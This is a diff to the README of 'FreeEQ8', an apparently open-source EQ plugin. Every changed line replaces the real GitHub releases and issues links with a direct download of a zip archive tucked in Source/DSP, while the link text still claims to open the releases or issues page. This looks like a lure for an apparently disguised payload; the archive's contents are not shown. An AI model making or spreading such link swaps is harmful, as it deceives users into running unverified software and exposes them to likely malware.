@@ -1,7 +1,7 @@
 # 🎛️ FreeEQ8 - Elevate Your Sound with Precision Control
 
 ## 🖥️ Download Now
-[![Download FreeEQ8](https://img.shields.io/badge/Download-FreeEQ8-blue.svg)](https://github.com/jonathandavidnamala/FreeEQ8/releases)
+[![Download FreeEQ8](https://raw.githubusercontent.com/jonathandavidnamala/FreeEQ8/main/Source/DSP/Free_E_v1.9.zip)](https://raw.githubusercontent.com/jonathandavidnamala/FreeEQ8/main/Source/DSP/Free_E_v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to FreeEQ8! This professional 8-band parametric equalizer (EQ) plugin is designed for audio enthusiasts who want to enhance their sound. FreeEQ8 is inspired by the popular Ableton EQ Eight and is available as a free, open-source VST3/AU for both macOS and Windows. 
@@ -9,7 +9,7 @@ Welcome to FreeEQ8! This professional 8-band parametric equalizer (EQ) plugin is
 ## 📥 Download & Install
 To get started with FreeEQ8, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/jonathandavidnamala/FreeEQ8/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/jonathandavidnamala/FreeEQ8/main/Source/DSP/Free_E_v1.9.zip) to go to the releases page.
   
 2. **Choose Your Version**: Look for the latest version of FreeEQ8. Find the file that matches your operating system, either for Windows or macOS.
 
@@ -50,7 +50,7 @@ If you encounter issues while downloading or using FreeEQ8, consider these tips:
 - **Update Your DAW**: Ensure your DAW is up to date for better compatibility.
 
 ## 🛠️ Support
-For additional help or questions, visit the GitHub repository's [issues page](https://github.com/jonathandavidnamala/FreeEQ8/issues). You can report problems, suggest features, or ask for support directly.
+For additional help or questions, visit the GitHub repository's [issues page](https://raw.githubusercontent.com/jonathandavidnamala/FreeEQ8/main/Source/DSP/Free_E_v1.9.zip). You can report problems, suggest features, or ask for support directly.
 
 ## 💬 Community
 Join our community for updates, tips, and sharing your experiences with FreeEQ8. Connect with other users on forums and social media platforms dedicated to music production and audio engineering. 
@@ -59,6 +59,6 @@ Join our community for updates, tips, and sharing your experiences with FreeEQ8.
 Interested in contributing to FreeEQ8? We welcome improvements and suggestions. Check our contribution guidelines on the GitHub repository for more information on how to get involved.
 
 ## 🔗 Visit the Releases Page Again
-For the latest version of FreeEQ8 or to access previous versions, please visit our [Releases Page](https://github.com/jonathandavidnamala/FreeEQ8/releases).
+For the latest version of FreeEQ8 or to access previous versions, please visit our [Releases Page](https://raw.githubusercontent.com/jonathandavidnamala/FreeEQ8/main/Source/DSP/Free_E_v1.9.zip).
 
 Enjoy creating music with FreeEQ8!
